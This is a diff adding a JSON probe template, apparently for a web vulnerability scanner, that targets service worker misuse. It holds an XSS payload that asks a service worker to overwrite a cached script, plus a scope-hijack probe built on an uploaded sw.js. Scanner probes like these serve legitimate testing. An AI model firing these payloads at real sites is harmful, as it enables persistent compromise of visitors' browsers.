@@ -1,0 +1,41 @@
+{
+  "category": "service_worker_attacks",
+  "description": "Service worker misuse — offline cache poisoning, scope hijack, push-subscription steal",
+  "contexts": {
+    "offline_cache_poison": {
+      "description": "Stored XSS that survives until SW is re-registered — cache.put() persists across page reloads",
+      "tech_match": ["pwa", "service-worker"],
+      "param_match": ["html", "content", "body"],
+      "probes": [
+        {
+          "payload": "<script>navigator.serviceWorker.ready.then(r=>r.active.postMessage({cache:'/main.js',body:'/*pwn*/'}))</script>",
+          "description": "If page accepts postMessage to SW and SW writes cache.put(), persistent compromise",
+          "matchers": [
+            {"type": "word", "words": ["serviceWorker", "cache.put", "navigator.serviceWorker"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "scope_hijack": {
+      "description": "SW registered at /uploads/sw.js controls /uploads/* — if user uploads override SW path, attacker controls scope",
+      "tech_match": ["pwa"],
+      "param_match": ["filename", "path", "upload_path"],
+      "probes": [
+        {
+          "payload": "<upload file named sw.js with valid SW content>",
+          "description": "Registered SW at user-controlled path hijacks parent scope",
+          "matchers": [
+            {"type": "word", "words": ["serviceWorker.register", "scope"], "condition": "or"},
+            {"type": "header", "header": "Content-Type", "value": "javascript", "condition": "and"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
